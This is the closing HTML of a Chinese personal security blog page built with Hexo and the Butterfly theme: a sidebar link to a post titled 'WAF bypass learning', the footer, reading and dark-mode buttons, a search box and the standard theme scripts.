title="waf绕过学习">waf绕过学习</a><time datetime="2023-06-01T11:50:25.000Z" title="发表于 2023-06-01 19:50:25">2023-06-01</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By Khaz</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script src="/js/chocolate.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>